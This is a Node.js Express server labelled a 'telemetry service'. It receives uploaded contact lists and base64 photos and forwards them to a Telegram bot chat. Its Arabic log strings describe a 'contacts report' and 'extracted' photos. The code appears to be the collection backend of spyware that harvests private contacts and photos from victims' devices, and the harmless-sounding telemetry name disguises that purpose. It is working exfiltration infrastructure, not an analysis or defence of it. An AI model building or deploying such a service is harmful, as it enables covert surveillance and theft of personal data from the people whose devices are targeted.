const express = require('express');
const axios = require('axios');
const FormData = require('form-data');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json({ limit: '25mb' }));

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

async function sendToTelegram(payloadType, data) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
        console.warn('Telegram credentials are not set.');
        return;
    }

    const apiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

    try {
        if (payloadType === 'contacts') {
            let text = `👥 **تقرير جهات الاتصال (${data.length} عنصر)**\n\n`;
            text += data.map(c => `👤 <b>${c.name || 'بدون اسم'}</b>\n📞 <code>${c.phone || 'بدون رقم'}</code>`).join('\n\n');
            
            if (text.length > 4000) text = text.substring(0, 4000) + '...';

            await axios.post(`${apiUrl}/sendMessage`, {
                chat_id: TELEGRAM_CHAT_ID,
                text: text,
                parse_mode: 'HTML'
            });
        } 
        else if (payloadType === 'photo') {
            const base64Image = data[0].photo_chunk;
            const assetId = data[0].asset_id || 'N/A';
            const buffer = Buffer.from(base64Image, 'base64');

            const form = new FormData();
            form.append('chat_id', TELEGRAM_CHAT_ID);
            form.append('photo', buffer, { filename: 'photo.jpg', contentType: 'image/jpeg' });
            form.append('caption', `🖼️ **صورة جديدة مستخرجة بجودة عالية**\n- Asset ID: <code>${assetId}</code>`);
            form.append('parse_mode', 'HTML');

            await axios.post(`${apiUrl}/sendPhoto`, form, {
                headers: form.getHeaders(),
                maxContentLength: Infinity,
                maxBodyLength: Infinity
            });
        }
    } catch (error) {
        console.error('❌ خطأ في إرسال البيانات لتيليجرام:', error.response?.data || error.message);
    }
}

app.post('/api/telemetry', async (req, res) => {
    try {
        const body = req.body;
        if (!body || (Array.isArray(body) && body.length === 0) || Object.keys(body).length === 0) {
            return res.status(400).json({ error: 'Empty payload.' });
        }

        if (Array.isArray(body) && body.length > 0 && body[0].photo_chunk) {
            await sendToTelegram('photo', body);
        } else if (Array.isArray(body)) {
            await sendToTelegram('contacts', body);
        }

        return res.status(200).json({ success: true, message: 'Forwarded to Telegram.' });
    } catch (error) {
        return res.status(500).json({ success: false, error: error.message });
    }
});

app.get('/health', (req, res) => {
    res.status(200).json({ status: 'UP', service: 'telegram-telemetry-service' });
});

app.listen(PORT, () => {
    console.log(`Telegram telemetry service is running on port ${PORT}`);
});
